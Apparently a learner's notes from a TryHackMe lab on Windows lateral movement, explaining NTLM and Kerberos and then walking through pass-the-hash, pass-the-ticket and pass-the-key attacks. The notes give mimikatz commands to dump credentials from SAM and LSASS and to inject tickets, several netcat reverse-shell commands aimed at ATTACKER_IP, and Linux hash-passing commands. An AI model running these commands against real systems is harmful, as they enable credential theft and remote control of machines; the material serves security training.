
In this task, we will take a look at a couple of alternatives available to log as a user when either of the following authentication protocols is available on the network:

- NTLM authentication
- Kerberos authentication

## NTLM Authentication

Before diving into the actual lateral movement techniques, let's take a look at how NTLM authentication works:

![NTLM authentication](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9434c96e1bc0519f8d851b44d85b6702.png)  

1. The client sends an authentication request to the server they want to access.
2. The server generates a random number and sends it as a challenge to the client.
3. The client combines his NTLM password hash with the challenge (and other known data) to generate a response to the challenge and sends it back to the server for verification.
4. The server forwards both the challenge and the response to the Domain Controller for verification.
5. The domain controller uses the challenge to recalculate the response and compares it to the initial response sent by the client. If they both match, the client is authenticated; otherwise, access is denied. The authentication result is sent back to the server.
6. The server forwards the authentication result to the client.


# Pass-the-Hash

INsted of craacking the NTML hash we can pass it around to authenticate

**Extracting NTLM hashes from local SAM:**

This method will only allow you to get hashes from local users on the machine. No domain user's hashes will be available.

```
mimikatz # privilege::debug 
mimikatz # token::elevate 
mimikatz # lsadump::sam 
RID : 000001f4 (500) 
User : Administrator 
Hash NTLM: 145e02c50333951f71d13c245d352b50
```

**Extracting NTLM hashes from LSASS memory:**

This method will let you extract any NTLM hashes for local users and any domain user that has recently logged onto the machine.

```
mimikatz # privilege::debug 
mimikatz # token::elevate 
mimikatz # sekurlsa::msv
```


We can then use the extracted hashes to perform a PtH attack by using mimikatz to inject an access token for the victim user on a reverse shell (or any other command you like) as follows:

```shell-session
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```


Notice we used `token::revert` to reestablish our original token privileges, as trying to pass-the-hash with an elevated token won't work. 

This would be the equivalent of using `runas /netonly` but with a hash instead of a password and will spawn a new reverse shell from where we can launch any command as the victim user.

To receive the reverse shell, we should run a reverse listener on our AttackBox:

**Passing the Hash Using Linux:**

```shell-session
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
```

```shell-session
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
```

```shell-session
evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
```


# Kerberos Authentication

Let's have a quick look at how Kerberos authentication works on Windows networks:

1. The user sends his username and a timestamp encrypted using a key derived from his password to the **Key Distribution Center (KDC)**, a service usually installed on the Domain Controller in charge of creating Kerberos tickets on the network.
    
    The KDC will create and send back a **Ticket Granting Ticket (TGT)**, allowing the user to request tickets to access specific services without passing their credentials to the services themselves. Along with the TGT, a **Session Key** is given to the user, which they will need to generate the requests that follow.
    
    Notice the TGT is encrypted using the **krbtgt** account's password hash, so the user can't access its contents. It is important to know that the encrypted TGT includes a copy of the Session Key as part of its contents, and the KDC has no need to store the Session Key as it can recover a copy by decrypting the TGT if needed.
    

![Kerberos get TGT](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/855d6fa3ea4076164934a2ba9717ffb5.png)  

3. When users want to connect to a service on the network like a share, website or database, they will use their TGT to ask the KDC for a **Ticket Granting Service (TGS)**. TGS are tickets that allow connection only to the specific service for which they were created. To request a TGS, the user will send his username and a timestamp encrypted using the Session Key, along with the TGT and a **Service Principal Name (SPN),** which indicates the service and server name we intend to access.
    
    As a result, the KDC will send us a TGS and a **Service Session Key**, which we will need to authenticate to the service we want to access. The TGS is encrypted using the **Service Owner Hash**. The Service Owner is the user or machine account under which the service runs. The TGS contains a copy of the Service Session Key on its encrypted contents so that the Service Owner can access it by decrypting the TGS.
    

![Kerberos get TGS](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0db01f1f1434f33fa8fb11de2bd165a6.png)  

5. The TGS can then be sent to the desired service to authenticate and establish a connection. The service will use its configured account's password hash to decrypt the TGS and validate the Service Session Key.

![Kerberos authenticate](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5d45b999328017c22b0f249069a88767.png)



## Pass-the-Ticket

Sometimes it will be possible to extract Kerberos tickets and session keys from LSASS memory using mimikatz. The process usually requires us to have SYSTEM privileges on the attacked machine and can be done as follows:

```shell-session
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

Once we have extracted the desired ticket, we can inject the tickets into the current session with the following command:

```shell-session
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```

To check if the tickets were correctly injected, you can use the klist command:

```
za\bob.jenkins@THMJMP2 C:\> klist 
Current LogonId is 0:0x1e43562 Cached Tickets: (1) #0> Client: Administrator @ ZA.TRYHACKME.COM Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96 Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize Start Time: 4/12/2022 0:28:35 (local) End Time: 4/12/2022 10:28:35 (local) Renew Time: 4/23/2022 0:28:35 (local) Session Key Type: AES-256-CTS-HMAC-SHA1-96 Cache Flags: 0x1 -> PRIMARY Kdc Called: THMDC.za.tryhackme.com

```



## Overpass-the-hash / Pass-the-Key


When a user requests a TGT, they send a timestamp encrypted with an encryption key derived from their password. The algorithm used to derive this key can be either DES (disabled by default on current Windows versions), RC4, AES128 or AES256, depending on the installed Windows version and Kerberos configuration. If we have any of those keys, we can ask the KDC for a TGT without requiring the actual password, hence the name **Pass-the-key (PtK)**.

We can obtain the Kerberos encryption keys from memory by using mimikatz with the following commands:

```shell-session
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

Depending on the available keys, we can run the following commands on mimikatz to get a reverse shell via Pass-the-Key (`nc64` is already available in THMJMP2 for your convenience):

**If we have the RC4 hash:**

```shell-session
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

**If we have the AES128 hash:**

```shell-session
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

**If we have the AES256 hash:**

```shell-session
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

